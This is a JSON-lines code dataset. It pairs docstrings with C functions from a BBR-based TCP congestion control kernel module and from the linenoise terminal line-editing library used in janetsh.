{"docstring": "/* Initialize pacing rate to: high_gain * init_cwnd / RTT. */\n", "func_signal": "static void bbr_init_pacing_rate_from_rtt(struct sock *sk)", "code": "{\n\tstruct tcp_sock *tp = tcp_sk(sk);\n\tstruct bbr *bbr = inet_csk_ca(sk);\n\tu64 bw;\n\tu32 rtt_us;\n\n\tif (tp->srtt_us) {\t\t/* any RTT sample yet? */\n\t\trtt_us = max(tp->srtt_us >> 3, 1U);\n\t\tbbr->has_seen_rtt = 1;\n\t} else {\t\t\t /* no RTT sample yet */\n\t\trtt_us = USEC_PER_MSEC;\t /* use nominal default RTT */\n\t}\n\tbw = (u64)tp->snd_cwnd * BW_UNIT;\n\tdo_div(bw, rtt_us);\n\tsk->sk_pacing_rate = bbr_bw_to_pacing_rate(sk, bw, bbr_high_gain);\n}", "path": "General\\Debian\\source\\kernel-v4.16\\tcp_nanqinlang.c", "repo_name": "tcp-nanqinlang/general", "stars": 477, "license": "None", "language": "c", "size": 12345}
{"docstring": "/* End cycle phase if it's time and/or we hit the phase's in-flight target. */\n", "func_signal": "static bool bbr_is_next_cycle_phase(struct sock *sk,\n\t\t\t\t    const struct rate_sample *rs)", "code": "{\n\tstruct tcp_sock *tp = tcp_sk(sk);\n\tstruct bbr *bbr = inet_csk_ca(sk);\n\tbool is_full_length =\n\t\ttcp_stamp_us_delta(tp->delivered_mstamp, bbr->cycle_mstamp) >\n\t\tbbr->min_rtt_us;\n\tu32 inflight, bw;\n\n\t/* The pacing_gain of 1.0 paces at the estimated bw to try to fully\n\t * use the pipe without increasing the queue.\n\t */\n\tif (bbr->pacing_gain == BBR_UNIT)\n\t\treturn is_full_length;\t\t/* just use wall clock time */\n\n\tinflight = rs->prior_in_flight;  /* what was in-flight before ACK? */\n\tbw = bbr_max_bw(sk);\n\n\t/* A pacing_gain > 1.0 probes for bw by trying to raise inflight to at\n\t * least pacing_gain*BDP; this may take more than min_rtt if min_rtt is\n\t * small (e.g. on a LAN). We do not persist if packets are lost, since\n\t * a path with small buffers may not hold that much.\n\t */\n\tif (bbr->pacing_gain > BBR_UNIT)\n\t\treturn is_full_length &&\n\t\t\t(rs->losses ||  /* perhaps pacing_gain*BDP won't fit */\n\t\t\t inflight >= bbr_target_cwnd(sk, bw, bbr->pacing_gain));\n\n\t/* A pacing_gain < 1.0 tries to drain extra queue we added if bw\n\t * probing didn't find more bw. If inflight falls to match BDP then we\n\t * estimate queue is drained; persisting would underutilize the pipe.\n\t */\n\treturn is_full_length ||\n\t\tinflight <= bbr_target_cwnd(sk, bw, BBR_UNIT);\n}", "path": "General\\Debian\\source\\kernel-v4.16\\tcp_nanqinlang.c", "repo_name": "tcp-nanqinlang/general", "stars": 477, "license": "None", "language": "c", "size": 12345}
{"docstring": "/* Pace using current bw estimate and a gain factor. In order to help drive the\n * network toward lower queues while maintaining high utilization and low\n * latency, the average pacing rate aims to be slightly (~1%) lower than the\n * estimated bandwidth. This is an important aspect of the design. In this\n * implementation this slightly lower pacing rate is achieved implicitly by not\n * including link-layer headers in the packet size used for the pacing rate.\n */\n", "func_signal": "static void bbr_set_pacing_rate(struct sock *sk, u32 bw, int gain)", "code": "{\n\tstruct tcp_sock *tp = tcp_sk(sk);\n\tstruct bbr *bbr = inet_csk_ca(sk);\n\tu32 rate = bbr_bw_to_pacing_rate(sk, bw, gain);\n\n\tif (unlikely(!bbr->has_seen_rtt && tp->srtt_us))\n\t\tbbr_init_pacing_rate_from_rtt(sk);\n\tif (bbr_full_bw_reached(sk) || rate > sk->sk_pacing_rate)\n\t\tsk->sk_pacing_rate = rate;\n}", "path": "General\\Debian\\source\\kernel-v4.16\\tcp_nanqinlang.c", "repo_name": "tcp-nanqinlang/general", "stars": 477, "license": "None", "language": "c", "size": 12345}
{"docstring": "/* Return the estimated bandwidth of the path, in pkts/uS << BW_SCALE. */\n", "func_signal": "static u32 bbr_bw(const struct sock *sk)", "code": "{\n\tstruct bbr *bbr = inet_csk_ca(sk);\n\n\treturn bbr->lt_use_bw ? bbr->lt_bw : bbr_max_bw(sk);\n}", "path": "General\\Debian\\source\\kernel-v4.16\\tcp_nanqinlang.c", "repo_name": "tcp-nanqinlang/general", "stars": 477, "license": "None", "language": "c", "size": 12345}
{"docstring": "/* Completely reset long-term bandwidth sampling. */\n", "func_signal": "static void bbr_reset_lt_bw_sampling(struct sock *sk)", "code": "{\n\tstruct bbr *bbr = inet_csk_ca(sk);\n\n\tbbr->lt_bw = 0;\n\tbbr->lt_use_bw = 0;\n\tbbr->lt_is_sampling = false;\n\tbbr_reset_lt_bw_sampling_interval(sk);\n}", "path": "General\\Debian\\source\\kernel-v4.16\\tcp_nanqinlang.c", "repo_name": "tcp-nanqinlang/general", "stars": 477, "license": "None", "language": "c", "size": 12345}
{"docstring": "/* Gain cycling: cycle pacing gain to converge to fair share of available bw. */\n", "func_signal": "static void bbr_update_cycle_phase(struct sock *sk,\n\t\t\t\t   const struct rate_sample *rs)", "code": "{\n\tstruct bbr *bbr = inet_csk_ca(sk);\n\n\tif (bbr->mode == BBR_PROBE_BW && bbr_is_next_cycle_phase(sk, rs))\n\t\tbbr_advance_cycle_phase(sk);\n}", "path": "General\\Debian\\source\\kernel-v4.16\\tcp_nanqinlang.c", "repo_name": "tcp-nanqinlang/general", "stars": 477, "license": "None", "language": "c", "size": 12345}
{"docstring": "/* Return rate in bytes per second, optionally with a gain.\n * The order here is chosen carefully to avoid overflow of u64. This should\n * work for input rates of up to 2.9Tbit/sec and gain of 2.89x.\n */\n", "func_signal": "static u64 bbr_rate_bytes_per_sec(struct sock *sk, u64 rate, int gain)", "code": "{\n\trate *= tcp_mss_to_mtu(sk, tcp_sk(sk)->mss_cache);\n\trate *= gain;\n\trate >>= BBR_SCALE;\n\trate *= USEC_PER_SEC;\n\treturn rate >> BW_SCALE;\n}", "path": "General\\Debian\\source\\kernel-v4.16\\tcp_nanqinlang.c", "repo_name": "tcp-nanqinlang/general", "stars": 477, "license": "None", "language": "c", "size": 12345}
{"docstring": "/* An optimization in BBR to reduce losses: On the first round of recovery, we\n * follow the packet conservation principle: send P packets per P packets acked.\n * After that, we slow-start and send at most 2*P packets per P packets acked.\n * After recovery finishes, or upon undo, we restore the cwnd we had when\n * recovery started (capped by the target cwnd based on estimated BDP).\n *\n * TODO(ycheng/ncardwell): implement a rate-based approach.\n */\n", "func_signal": "static bool bbr_set_cwnd_to_recover_or_restore(\n\tstruct sock *sk, const struct rate_sample *rs, u32 acked, u32 *new_cwnd)", "code": "{\n\tstruct tcp_sock *tp = tcp_sk(sk);\n\tstruct bbr *bbr = inet_csk_ca(sk);\n\tu8 prev_state = bbr->prev_ca_state, state = inet_csk(sk)->icsk_ca_state;\n\tu32 cwnd = tp->snd_cwnd;\n\n\t/* An ACK for P pkts should release at most 2*P packets. We do this\n\t * in two steps. First, here we deduct the number of lost packets.\n\t * Then, in bbr_set_cwnd() we slow start up toward the target cwnd.\n\t */\n\tif (rs->losses > 0)\n\t\tcwnd = max_t(s32, cwnd - rs->losses, 1);\n\n\tif (state == TCP_CA_Recovery && prev_state != TCP_CA_Recovery) {\n\t\t/* Starting 1st round of Recovery, so do packet conservation. */\n\t\tbbr->packet_conservation = 1;\n\t\tbbr->next_rtt_delivered = tp->delivered;  /* start round now */\n\t\t/* Cut unused cwnd from app behavior, TSQ, or TSO deferral: */\n\t\tcwnd = tcp_packets_in_flight(tp) + acked;\n\t} else if (prev_state >= TCP_CA_Recovery && state < TCP_CA_Recovery) {\n\t\t/* Exiting loss recovery; restore cwnd saved before recovery. */\n\t\tbbr->restore_cwnd = 1;\n\t\tbbr->packet_conservation = 0;\n\t}\n\tbbr->prev_ca_state = state;\n\n\tif (bbr->restore_cwnd) {\n\t\t/* Restore cwnd after exiting loss recovery or PROBE_RTT. */\n\t\tcwnd = max(cwnd, bbr->prior_cwnd);\n\t\tbbr->restore_cwnd = 0;\n\t}\n\n\tif (bbr->packet_conservation) {\n\t\t*new_cwnd = max(cwnd, tcp_packets_in_flight(tp) + acked);\n\t\treturn true;\t/* yes, using packet conservation */\n\t}\n\t*new_cwnd = cwnd;\n\treturn false;\n}", "path": "General\\Debian\\source\\kernel-v4.16\\tcp_nanqinlang.c", "repo_name": "tcp-nanqinlang/general", "stars": 477, "license": "None", "language": "c", "size": 12345}
{"docstring": "/* Save \"last known good\" cwnd so we can restore it after losses or PROBE_RTT */\n", "func_signal": "static void bbr_save_cwnd(struct sock *sk)", "code": "{\n\tstruct tcp_sock *tp = tcp_sk(sk);\n\tstruct bbr *bbr = inet_csk_ca(sk);\n\n\tif (bbr->prev_ca_state < TCP_CA_Recovery && bbr->mode != BBR_PROBE_RTT)\n\t\tbbr->prior_cwnd = tp->snd_cwnd;  /* this cwnd is good enough */\n\telse  /* loss recovery or BBR_PROBE_RTT have temporarily cut cwnd */\n\t\tbbr->prior_cwnd = max(bbr->prior_cwnd, tp->snd_cwnd);\n}", "path": "General\\Debian\\source\\kernel-v4.16\\tcp_nanqinlang.c", "repo_name": "tcp-nanqinlang/general", "stars": 477, "license": "None", "language": "c", "size": 12345}
{"docstring": "/* Token-bucket traffic policers are common (see \"An Internet-Wide Analysis of\n * Traffic Policing\", SIGCOMM 2016). BBR detects token-bucket policers and\n * explicitly models their policed rate, to reduce unnecessary losses. We\n * estimate that we're policed if we see 2 consecutive sampling intervals with\n * consistent throughput and high packet loss. If we think we're being policed,\n * set lt_bw to the \"long-term\" average delivery rate from those 2 intervals.\n */\n", "func_signal": "static void bbr_lt_bw_sampling(struct sock *sk, const struct rate_sample *rs)", "code": "{\n\tstruct tcp_sock *tp = tcp_sk(sk);\n\tstruct bbr *bbr = inet_csk_ca(sk);\n\tu32 lost, delivered;\n\tu64 bw;\n\tu32 t;\n\n\tif (bbr->lt_use_bw) {\t/* already using long-term rate, lt_bw? */\n\t\tif (bbr->mode == BBR_PROBE_BW && bbr->round_start &&\n\t\t    ++bbr->lt_rtt_cnt >= bbr_lt_bw_max_rtts) {\n\t\t\tbbr_reset_lt_bw_sampling(sk);    /* stop using lt_bw */\n\t\t\tbbr_reset_probe_bw_mode(sk);  /* restart gain cycling */\n\t\t}\n\t\treturn;\n\t}\n\n\t/* Wait for the first loss before sampling, to let the policer exhaust\n\t * its tokens and estimate the steady-state rate allowed by the policer.\n\t * Starting samples earlier includes bursts that over-estimate the bw.\n\t */\n\tif (!bbr->lt_is_sampling) {\n\t\tif (!rs->losses)\n\t\t\treturn;\n\t\tbbr_reset_lt_bw_sampling_interval(sk);\n\t\tbbr->lt_is_sampling = true;\n\t}\n\n\t/* To avoid underestimates, reset sampling if we run out of data. */\n\tif (rs->is_app_limited) {\n\t\tbbr_reset_lt_bw_sampling(sk);\n\t\treturn;\n\t}\n\n\tif (bbr->round_start)\n\t\tbbr->lt_rtt_cnt++;\t/* count round trips in this interval */\n\tif (bbr->lt_rtt_cnt < bbr_lt_intvl_min_rtts)\n\t\treturn;\t\t/* sampling interval needs to be longer */\n\tif (bbr->lt_rtt_cnt > 4 * bbr_lt_intvl_min_rtts) {\n\t\tbbr_reset_lt_bw_sampling(sk);  /* interval is too long */\n\t\treturn;\n\t}\n\n\t/* End sampling interval when a packet is lost, so we estimate the\n\t * policer tokens were exhausted. Stopping the sampling before the\n\t * tokens are exhausted under-estimates the policed rate.\n\t */\n\tif (!rs->losses)\n\t\treturn;\n\n\t/* Calculate packets lost and delivered in sampling interval. */\n\tlost = tp->lost - bbr->lt_last_lost;\n\tdelivered = tp->delivered - bbr->lt_last_delivered;\n\t/* Is loss rate (lost/delivered) >= lt_loss_thresh? If not, wait. */\n\tif (!delivered || (lost << BBR_SCALE) < bbr_lt_loss_thresh * delivered)\n\t\treturn;\n\n\t/* Find average delivery rate in this sampling interval. */\n\tt = div_u64(tp->delivered_mstamp, USEC_PER_MSEC) - bbr->lt_last_stamp;\n\tif ((s32)t < 1)\n\t\treturn;\t\t/* interval is less than one ms, so wait */\n\t/* Check if can multiply without overflow */\n\tif (t >= ~0U / USEC_PER_MSEC) {\n\t\tbbr_reset_lt_bw_sampling(sk);  /* interval too long; reset */\n\t\treturn;\n\t}\n\tt *= USEC_PER_MSEC;\n\tbw = (u64)delivered * BW_UNIT;\n\tdo_div(bw, t);\n\tbbr_lt_bw_interval_done(sk, bw);\n}", "path": "General\\Debian\\source\\kernel-v4.16\\tcp_nanqinlang.c", "repo_name": "tcp-nanqinlang/general", "stars": 477, "license": "None", "language": "c", "size": 12345}
{"docstring": "/* Convert a BBR bw and gain factor to a pacing rate in bytes per second. */\n", "func_signal": "static u32 bbr_bw_to_pacing_rate(struct sock *sk, u32 bw, int gain)", "code": "{\n\tu64 rate = bw;\n\n\trate = bbr_rate_bytes_per_sec(sk, rate, gain);\n\trate = min_t(u64, rate, sk->sk_max_pacing_rate);\n\treturn rate;\n}", "path": "General\\Debian\\source\\kernel-v4.16\\tcp_nanqinlang.c", "repo_name": "tcp-nanqinlang/general", "stars": 477, "license": "None", "language": "c", "size": 12345}
{"docstring": "/* Do we estimate that STARTUP filled the pipe? */\n", "func_signal": "static bool bbr_full_bw_reached(const struct sock *sk)", "code": "{\n\tconst struct bbr *bbr = inet_csk_ca(sk);\n\n\treturn bbr->full_bw_reached;\n}", "path": "General\\Debian\\source\\kernel-v4.16\\tcp_nanqinlang.c", "repo_name": "tcp-nanqinlang/general", "stars": 477, "license": "None", "language": "c", "size": 12345}
{"docstring": "/* Long-term bw sampling interval is done. Estimate whether we're policed. */\n", "func_signal": "static void bbr_lt_bw_interval_done(struct sock *sk, u32 bw)", "code": "{\n\tstruct bbr *bbr = inet_csk_ca(sk);\n\tu32 diff;\n\n\tif (bbr->lt_bw) {  /* do we have bw from a previous interval? */\n\t\t/* Is new bw close to the lt_bw from the previous interval? */\n\t\tdiff = abs(bw - bbr->lt_bw);\n\t\tif ((diff * BBR_UNIT <= bbr_lt_bw_ratio * bbr->lt_bw) ||\n\t\t    (bbr_rate_bytes_per_sec(sk, diff, BBR_UNIT) <=\n\t\t     bbr_lt_bw_diff)) {\n\t\t\t/* All criteria are met; estimate we're policed. */\n\t\t\tbbr->lt_bw = (bw + bbr->lt_bw) >> 1;  /* avg 2 intvls */\n\t\t\tbbr->lt_use_bw = 1;\n\t\t\tbbr->pacing_gain = BBR_UNIT;  /* try to avoid drops */\n\t\t\tbbr->lt_rtt_cnt = 0;\n\t\t\treturn;\n\t\t}\n\t}\n\tbbr->lt_bw = bw;\n\tbbr_reset_lt_bw_sampling_interval(sk);\n}", "path": "General\\Debian\\source\\kernel-v4.16\\tcp_nanqinlang.c", "repo_name": "tcp-nanqinlang/general", "stars": 477, "license": "None", "language": "c", "size": 12345}
{"docstring": "/* Return the windowed max recent bandwidth sample, in pkts/uS << BW_SCALE. */\n", "func_signal": "static u32 bbr_max_bw(const struct sock *sk)", "code": "{\n\tstruct bbr *bbr = inet_csk_ca(sk);\n\n\treturn minmax_get(&bbr->bw);\n}", "path": "General\\Debian\\source\\kernel-v4.16\\tcp_nanqinlang.c", "repo_name": "tcp-nanqinlang/general", "stars": 477, "license": "None", "language": "c", "size": 12345}
{"docstring": "/* In theory BBR does not need to undo the cwnd since it does not\n * always reduce cwnd on losses (see bbr_main()). Keep it for now.\n */\n", "func_signal": "static u32 bbr_undo_cwnd(struct sock *sk)", "code": "{\n\tstruct bbr *bbr = inet_csk_ca(sk);\n\n\tbbr->full_bw = 0;   /* spurious slow-down; reset full pipe detection */\n\tbbr->full_bw_cnt = 0;\n\tbbr_reset_lt_bw_sampling(sk);\n\treturn tcp_sk(sk)->snd_cwnd;\n}", "path": "General\\Debian\\source\\kernel-v4.16\\tcp_nanqinlang.c", "repo_name": "tcp-nanqinlang/general", "stars": 477, "license": "None", "language": "c", "size": 12345}
{"docstring": "/* If pipe is probably full, drain the queue and then enter steady-state. */\n", "func_signal": "static void bbr_check_drain(struct sock *sk, const struct rate_sample *rs)", "code": "{\n\tstruct bbr *bbr = inet_csk_ca(sk);\n\n\tif (bbr->mode == BBR_STARTUP && bbr_full_bw_reached(sk)) {\n\t\tbbr->mode = BBR_DRAIN;\t/* drain queue we created */\n\t\tbbr->pacing_gain = bbr_drain_gain;\t/* pace slow to drain */\n\t\tbbr->cwnd_gain = bbr_high_gain;\t/* maintain cwnd */\n\t}\t/* fall through to check if in-flight is already small: */\n\tif (bbr->mode == BBR_DRAIN &&\n\t    tcp_packets_in_flight(tcp_sk(sk)) <=\n\t    bbr_target_cwnd(sk, bbr_max_bw(sk), BBR_UNIT))\n\t\tbbr_reset_probe_bw_mode(sk);  /* we estimate queue is drained */\n}", "path": "General\\Debian\\source\\kernel-v4.16\\tcp_nanqinlang.c", "repo_name": "tcp-nanqinlang/general", "stars": 477, "license": "None", "language": "c", "size": 12345}
{"docstring": "/* Entering loss recovery, so save cwnd for when we exit or undo recovery. */\n", "func_signal": "static u32 bbr_ssthresh(struct sock *sk)", "code": "{\n\tbbr_save_cwnd(sk);\n\treturn TCP_INFINITE_SSTHRESH;\t /* BBR does not use ssthresh */\n}", "path": "General\\Debian\\source\\kernel-v4.16\\tcp_nanqinlang.c", "repo_name": "tcp-nanqinlang/general", "stars": 477, "license": "None", "language": "c", "size": 12345}
{"docstring": "/* Estimate when the pipe is full, using the change in delivery rate: BBR\n * estimates that STARTUP filled the pipe if the estimated bw hasn't changed by\n * at least bbr_full_bw_thresh (25%) after bbr_full_bw_cnt (3) non-app-limited\n * rounds. Why 3 rounds: 1: rwin autotuning grows the rwin, 2: we fill the\n * higher rwin, 3: we get higher delivery rate samples. Or transient\n * cross-traffic or radio noise can go away. CUBIC Hystart shares a similar\n * design goal, but uses delay and inter-ACK spacing instead of bandwidth.\n */\n", "func_signal": "static void bbr_check_full_bw_reached(struct sock *sk,\n\t\t\t\t      const struct rate_sample *rs)", "code": "{\n\tstruct bbr *bbr = inet_csk_ca(sk);\n\tu32 bw_thresh;\n\n\tif (bbr_full_bw_reached(sk) || !bbr->round_start || rs->is_app_limited)\n\t\treturn;\n\n\tbw_thresh = (u64)bbr->full_bw * bbr_full_bw_thresh >> BBR_SCALE;\n\tif (bbr_max_bw(sk) >= bw_thresh) {\n\t\tbbr->full_bw = bbr_max_bw(sk);\n\t\tbbr->full_bw_cnt = 0;\n\t\treturn;\n\t}\n\t++bbr->full_bw_cnt;\n\tbbr->full_bw_reached = bbr->full_bw_cnt >= bbr_full_bw_cnt;\n}", "path": "General\\Debian\\source\\kernel-v4.16\\tcp_nanqinlang.c", "repo_name": "tcp-nanqinlang/general", "stars": 477, "license": "None", "language": "c", "size": 12345}
{"docstring": "/* Start a new long-term sampling interval. */\n", "func_signal": "static void bbr_reset_lt_bw_sampling_interval(struct sock *sk)", "code": "{\n\tstruct tcp_sock *tp = tcp_sk(sk);\n\tstruct bbr *bbr = inet_csk_ca(sk);\n\n\tbbr->lt_last_stamp = div_u64(tp->delivered_mstamp, USEC_PER_MSEC);\n\tbbr->lt_last_delivered = tp->delivered;\n\tbbr->lt_last_lost = tp->lost;\n\tbbr->lt_rtt_cnt = 0;\n}", "path": "General\\Debian\\source\\kernel-v4.16\\tcp_nanqinlang.c", "repo_name": "tcp-nanqinlang/general", "stars": 477, "license": "None", "language": "c", "size": 12345}
{"docstring": "/* Estimate the bandwidth based on how fast packets are delivered */\n", "func_signal": "static void bbr_update_bw(struct sock *sk, const struct rate_sample *rs)", "code": "{\n\tstruct tcp_sock *tp = tcp_sk(sk);\n\tstruct bbr *bbr = inet_csk_ca(sk);\n\tu64 bw;\n\n\tbbr->round_start = 0;\n\tif (rs->delivered < 0 || rs->interval_us <= 0)\n\t\treturn; /* Not a valid observation */\n\n\t/* See if we've reached the next RTT */\n\tif (!before(rs->prior_delivered, bbr->next_rtt_delivered)) {\n\t\tbbr->next_rtt_delivered = tp->delivered;\n\t\tbbr->rtt_cnt++;\n\t\tbbr->round_start = 1;\n\t\tbbr->packet_conservation = 0;\n\t}\n\n\tbbr_lt_bw_sampling(sk, rs);\n\n\t/* Divide delivered by the interval to find a (lower bound) bottleneck\n\t * bandwidth sample. Delivered is in packets and interval_us in uS and\n\t * ratio will be <<1 for most connections. So delivered is first scaled.\n\t */\n\tbw = (u64)rs->delivered * BW_UNIT;\n\tdo_div(bw, rs->interval_us);\n\n\t/* If this sample is application-limited, it is likely to have a very\n\t * low delivered count that represents application behavior rather than\n\t * the available network rate. Such a sample could drag down estimated\n\t * bw, causing needless slow-down. Thus, to continue to send at the\n\t * last measured network rate, we filter out app-limited samples unless\n\t * they describe the path bw at least as well as our bw model.\n\t *\n\t * So the goal during app-limited phase is to proceed with the best\n\t * network rate no matter how long. We automatically leave this\n\t * phase when app writes faster than the network can deliver :)\n\t */\n\tif (!rs->is_app_limited || bw >= bbr_max_bw(sk)) {\n\t\t/* Incorporate new sample into our max bw filter. */\n\t\tminmax_running_max(&bbr->bw, bbr_bw_rtts, bbr->rtt_cnt, bw);\n\t}\n}", "path": "General\\Debian\\source\\kernel-v4.16\\tcp_nanqinlang.c", "repo_name": "tcp-nanqinlang/general", "stars": 477, "license": "None", "language": "c", "size": 12345}
{"docstring": "/* Insert the character 'c' at cursor current position.\n *\n * On error writing to the terminal -1 is returned, otherwise 0. */\n", "func_signal": "int linenoiseEditInsert(struct linenoiseState *l, const char *cbuf, int clen)", "code": "{\n  if (l->len + clen <= l->buflen) {\n    if (l->len == l->pos) {\n      memcpy(&l->buf[l->pos], cbuf, clen);\n      l->pos += clen;\n      l->len += clen;\n      ;\n      l->buf[l->len] = '\\0';\n      if ((!mlmode &&\n           promptTextColumnLen(l->prompt, l->plen) +\n                   columnPos(l->buf, l->len, l->len) <\n               l->cols &&\n           !hintsCallback)) {\n        /* Avoid a full update of the line in the\n         * trivial case. */\n        if (write(l->ofd, cbuf, clen) == -1)\n          return -1;\n      } else {\n        refreshLine(l);\n      }\n    } else {\n      memmove(l->buf + l->pos + clen, l->buf + l->pos, l->len - l->pos);\n      memcpy(&l->buf[l->pos], cbuf, clen);\n      l->pos += clen;\n      l->len += clen;\n      l->buf[l->len] = '\\0';\n      refreshLine(l);\n    }\n  }\n  return 0;\n}", "path": "src\\readnoise\\linenoise.c", "repo_name": "andrewchambers/janetsh", "stars": 366, "license": "mit", "language": "c", "size": 1074}
{"docstring": "/* Set used defined encoding functions */\n", "func_signal": "void linenoiseSetEncodingFunctions(linenoisePrevCharLen *prevCharLenFunc,\n                                   linenoiseNextCharLen *nextCharLenFunc,\n                                   linenoiseReadCode *readCodeFunc)", "code": "{\n  prevCharLen = prevCharLenFunc;\n  nextCharLen = nextCharLenFunc;\n  readCode = readCodeFunc;\n}", "path": "src\\readnoise\\linenoise.c", "repo_name": "andrewchambers/janetsh", "stars": 366, "license": "mit", "language": "c", "size": 1074}
{"docstring": "/* Set if to use or not the multi line mode. */\n", "func_signal": "void linenoiseSetMultiLine(int ml)", "code": "{ mlmode = ml; }\n\n/* Return true if the terminal name is in the list of terminals we know are\n * not able to understand basic escape sequences. */\nstatic int isUnsupportedTerm(void) {\n  char *term = getenv(\"TERM\");\n  int j;\n\n  if (term == NULL)\n    return 0;\n  for (j = 0; unsupported_term[j]; j++)\n    if (!strcasecmp(term, unsupported_term[j]))\n      return 1;\n  return 0;\n}", "path": "src\\readnoise\\linenoise.c", "repo_name": "andrewchambers/janetsh", "stars": 366, "license": "mit", "language": "c", "size": 1074}
{"docstring": "/* This function calls the line editing function linenoiseEdit() using\n * the STDIN file descriptor set in raw mode. */\n", "func_signal": "static int linenoiseRaw(char *buf, size_t buflen, const char *prompt)", "code": "{\n  int count;\n\n  if (buflen == 0) {\n    errno = EINVAL;\n    return -1;\n  }\n\n  if (enableRawMode(STDIN_FILENO) == -1)\n    return -1;\n  count = linenoiseEdit(STDIN_FILENO, STDOUT_FILENO, buf, buflen, prompt);\n  disableRawMode(STDIN_FILENO);\n  printf(\"\\n\");\n  return count;\n}", "path": "src\\readnoise\\linenoise.c", "repo_name": "andrewchambers/janetsh", "stars": 366, "license": "mit", "language": "c", "size": 1074}
{"docstring": "/* Get column length of prompt text\n */\n", "func_signal": "static size_t promptTextColumnLen(const char *prompt, size_t plen)", "code": "{\n  char buf[LINENOISE_MAX_LINE];\n  size_t buf_len = 0;\n  size_t off = 0;\n  while (off < plen) {\n    size_t len;\n    if (isAnsiEscape(prompt + off, plen - off, &len)) {\n      off += len;\n      continue;\n    }\n    buf[buf_len++] = prompt[off++];\n  }\n  return columnPos(buf, buf_len, buf_len);\n}", "path": "src\\readnoise\\linenoise.c", "repo_name": "andrewchambers/janetsh", "stars": 366, "license": "mit", "language": "c", "size": 1074}
{"docstring": "/* The high level function that is the main API of the linenoise library.\n * This function checks if the terminal has basic capabilities, just checking\n * for a blacklist of stupid terminals, and later either calls the line\n * editing function or uses dummy fgets() so that you will be able to type\n * something even in the most desperate of the conditions. */\n", "func_signal": "char *linenoise(const char *prompt)", "code": "{\n  char buf[LINENOISE_MAX_LINE];\n  int count;\n\n  if (!isatty(STDIN_FILENO)) {\n    /* Not a tty: read from file / pipe. In this mode we don't want any\n     * limit to the line size, so we call a function to handle that. */\n    return linenoiseNoTTY();\n  } else if (isUnsupportedTerm()) {\n    size_t len;\n\n    printf(\"%s\", prompt);\n    fflush(stdout);\n    if (fgets(buf, LINENOISE_MAX_LINE, stdin) == NULL)\n      return NULL;\n    len = strlen(buf);\n    while (len && (buf[len - 1] == '\\n' || buf[len - 1] == '\\r')) {\n      len--;\n      buf[len] = '\\0';\n    }\n    return strdup(buf);\n  } else {\n    count = linenoiseRaw(buf, LINENOISE_MAX_LINE, prompt);\n    if (count == -1)\n      return NULL;\n    return strdup(buf);\n  }\n}", "path": "src\\readnoise\\linenoise.c", "repo_name": "andrewchambers/janetsh", "stars": 366, "license": "mit", "language": "c", "size": 1074}
{"docstring": "/* Check if text is an ANSI escape sequence\n */\n", "func_signal": "static int isAnsiEscape(const char *buf, size_t buf_len, size_t *len)", "code": "{\n  if (buf_len > 2 && !memcmp(\"\\033[\", buf, 2)) {\n    size_t off = 2;\n    while (off < buf_len) {\n      switch (buf[off++]) {\n      case 'A':\n      case 'B':\n      case 'C':\n      case 'D':\n      case 'E':\n      case 'F':\n      case 'G':\n      case 'H':\n      case 'J':\n      case 'K':\n      case 'S':\n      case 'T':\n      case 'f':\n      case 'm':\n        *len = off;\n        return 1;\n      }\n    }\n  }\n  return 0;\n}", "path": "src\\readnoise\\linenoise.c", "repo_name": "andrewchambers/janetsh", "stars": 366, "license": "mit", "language": "c", "size": 1074}
{"docstring": "/* Set the maximum length for the history. This function can be called even\n * if there is already some history, the function will make sure to retain\n * just the latest 'len' elements if the new history length value is smaller\n * than the amount of items already inside the history. */\n", "func_signal": "int linenoiseHistorySetMaxLen(int len)", "code": "{\n  char **new;\n\n  if (len < 1)\n    return 0;\n  if (history) {\n    int tocopy = history_len;\n\n    new = malloc(sizeof(char *) * len);\n    if (new == NULL)\n      return 0;\n\n    /* If we can't copy everything, free the elements we'll not use. */\n    if (len < tocopy) {\n      int j;\n\n      for (j = 0; j < tocopy - len; j++)\n        free(history[j]);\n      tocopy = len;\n    }\n    memset(new, 0, sizeof(char *) * len);\n    memcpy(new, history + (history_len - tocopy), sizeof(char *) * tocopy);\n    free(history);\n    history = new;\n  }\n  history_max_len = len;\n  if (history_len > history_max_len)\n    history_len = history_max_len;\n  return 1;\n}", "path": "src\\readnoise\\linenoise.c", "repo_name": "andrewchambers/janetsh", "stars": 366, "license": "mit", "language": "c", "size": 1074}
{"docstring": "/* Get column length from begining of buffer to current byte position */\n", "func_signal": "static size_t columnPos(const char *buf, size_t buf_len, size_t pos)", "code": "{\n  size_t ret = 0;\n  size_t off = 0;\n  while (off < pos) {\n    size_t col_len;\n    size_t len = nextCharLen(buf, buf_len, off, &col_len);\n    off += len;\n    ret += col_len;\n  }\n  return ret;\n}", "path": "src\\readnoise\\linenoise.c", "repo_name": "andrewchambers/janetsh", "stars": 366, "license": "mit", "language": "c", "size": 1074}
{"docstring": "/* Backspace implementation. */\n", "func_signal": "void linenoiseEditBackspace(struct linenoiseState *l)", "code": "{\n  if (l->pos > 0 && l->len > 0) {\n    int chlen = prevCharLen(l->buf, l->len, l->pos, NULL);\n    memmove(l->buf + l->pos - chlen, l->buf + l->pos, l->len - l->pos);\n    l->pos -= chlen;\n    l->len -= chlen;\n    l->buf[l->len] = '\\0';\n    refreshLine(l);\n  }\n}", "path": "src\\readnoise\\linenoise.c", "repo_name": "andrewchambers/janetsh", "stars": 366, "license": "mit", "language": "c", "size": 1074}
{"docstring": "/* This function is called when linenoise() is called with the standard\n * input file descriptor not attached to a TTY. So for example when the\n * program using linenoise is called in pipe or with a file redirected\n * to its standard input. In this case, we want to be able to return the\n * line regardless of its length (by default we are limited to 4k). */\n", "func_signal": "static char *linenoiseNoTTY(void)", "code": "{\n  char *line = NULL;\n  size_t len = 0, maxlen = 0;\n\n  while (1) {\n    if (len == maxlen) {\n      if (maxlen == 0)\n        maxlen = 16;\n      maxlen *= 2;\n      char *oldval = line;\n      line = realloc(line, maxlen);\n      if (line == NULL) {\n        if (oldval)\n          free(oldval);\n        return NULL;\n      }\n    }\n    int c = fgetc(stdin);\n    if (c == EOF || c == '\\n') {\n      if (c == EOF && len == 0) {\n        free(line);\n        return NULL;\n      } else {\n        line[len] = '\\0';\n        return line;\n      }\n    } else {\n      line[len] = c;\n      len++;\n    }\n  }\n}", "path": "src\\readnoise\\linenoise.c", "repo_name": "andrewchambers/janetsh", "stars": 366, "license": "mit", "language": "c", "size": 1074}
